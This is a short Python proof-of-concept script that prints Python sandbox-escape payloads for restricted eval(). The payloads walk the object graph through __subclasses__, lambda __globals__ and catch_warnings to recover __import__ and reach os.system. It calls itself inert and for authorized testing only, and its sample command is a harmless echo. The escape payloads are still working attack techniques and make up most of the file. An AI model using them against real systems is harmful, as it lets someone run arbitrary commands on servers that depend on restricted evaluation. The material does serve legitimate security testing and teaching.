"""
  Safe PoC -> x8bitranjit
  INERT BY DESIGN: running this file only PRINTS the escape payloads -
  paste them into the target's restricted-eval feature (authorized only).

  WHAT THIS DEMONSTRATES: Python sandbox escapes.
  - eval() with stripped builtins is still escapable via the object graph.
  - restricted eval is NOT a sandbox (same rule as node vm).
"""
print("== python eval escape: builtins via object graph ==")
print(r"""    ().__class__.__bases__[0].__subclasses__()
    # locate a subclass exposing __globals__/_module, then walk back to
    # __builtins__ -> __import__ restored -> os module reachable""")

print("== python eval escape: lambda globals (builtins NOT stripped) ==")
print(r"""    (lambda:0).__globals__["__builtins__"]["__import__"]("os").system("echo Safe PoC -> x8bitranjit")""")

print("== python eval escape: catch_warnings path (builtins stripped) ==")
print(r"""    [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == "catch_warnings"]
    # catch_warnings()._module.__builtins__ -> full builtins recovered""")

print("== python eval escape: code/Function constructor path ==")
print(r"""    [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == "code"]""")

print("== Benign rule: echo/id as the only command ==")
